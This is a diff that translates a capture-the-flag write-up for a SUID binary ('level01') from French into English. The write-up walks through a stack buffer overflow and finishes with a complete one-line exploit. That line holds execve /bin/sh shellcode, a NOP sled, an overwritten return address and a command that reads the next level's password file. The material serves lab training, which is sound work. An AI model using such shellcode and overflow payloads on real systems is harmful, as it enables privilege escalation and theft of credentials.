@@ -4,21 +4,21 @@ The program contains SUID permissions for the user level02, which will allow us 
 
 ## Disassembly
 
-- Allocation d'un buffer de 64 bytes sur la stack
-- Un appel à la fonction `fgets` avec 256 bytes lu sur la stdin
-- Un appel à la fonction `fgets` avec 100 bytes lu sur la stin.
+- Allocation of a 64-byte buffer on the stack
+- A call to the `fgets` function with 256 bytes read from stdin
+- A call to the `fgets` function with 100 bytes read from stdin
 
 ## Exploit
 
-L'object est de stocker un shellcode dans le buffer `a_user_name`, puis d'écraser l'EIP de la fonction `main` pour jump directement sur le shellcode.
+The goal is to store shellcode in the buffer `a_user_name`, then overwrite the EIP of the `main` function to jump directly to the shellcode.
 
-Premierement, comme on peut le voir dans la fonction `verify_user_name`, il y a un `memcpy(a_user_name, "dat_wil", 7)` qui nous impose d'utiliser le nom d'utilisateur `dat_wil`.
+First, as we can see in the `verify_user_name` function, there is a `memcpy(a_user_name, "dat_wil", 7)` which requires us to use the username `dat_wil`.
 
-Ensuite, il nous faut calculer l'offset à mettre dans le deuxième `fgets`.
+Next, we need to calculate the offset to be used in the second `fgets`.
 
 [Buffer Overflow Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
 
-Ce site genere une string que l'on peut mettre dans le deuxième `fgets` avec GDB afin de provoquer un segfault et de calculer l'offset pour overwrite l'EIP du `main`.
+This site generates a string that can be used in the second `fgets` with GDB to cause a segfault and calculate the offset to overwrite the EIP in `main`.
 
 ```bash
 gdb ./level01
@@ -36,9 +36,9 @@ Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
 ```
 
-Si on rendre l'addresse du segfault (`0x37634136`)dans le site, on obtenir un offset de 80 bytes
+If we enter the segfault address (`0x37634136`)on the site, we get an offset of 80 bytes
 
-Maintenant, il nous faut obtenir l'addresse de la variable `a_user_name` pour connaitre l'addresse du shellcode que l'on va injecter.
+Now we need to get the address of the variable `a_user_name` to know the address of the shellcode that we are going to inject.
 
 ```bash
 gdb ./level01
@@ -46,13 +46,13 @@ gdb ./level01
 0x0804a040  a_user_name
 ```
 
-Il y a la chaine de caracteres `dat_wil` en premier dans `a_user_name` donc notre shellcode se trouvera à l'addresse `0x0804a040 + len("dat_wil") + 1 pour le \0 = 0x0804a048`
+There is the string `dat_wil` at the beginning of `a_user_name` so our shellcode will be at address `0x0804a040 + len("dat_wil") + 1 pour le \0 = 0x0804a048`
 
 
-Faisons la commande complète, en ajoutant un peu d'instructions NOP "\x90" devant le shellcode pour pouvoir facilement retomber dessus.
+Let's construct the full command, adding some NOP instructions "\x90" before the shellcode to make it easier to land on it.
 
 ```bash
 (python -c 'print("dat_wil" + "\x90" * 20 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'; python -c 'print("\x90" * 80 + "\x48\xa0\x04\x08")'; echo "cat /home/users/level02/.pass") | ./level01
 ```
 
-Shellcode: https://shell-storm.org/shellcode/files/shellcode-752.html
+[Shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html)
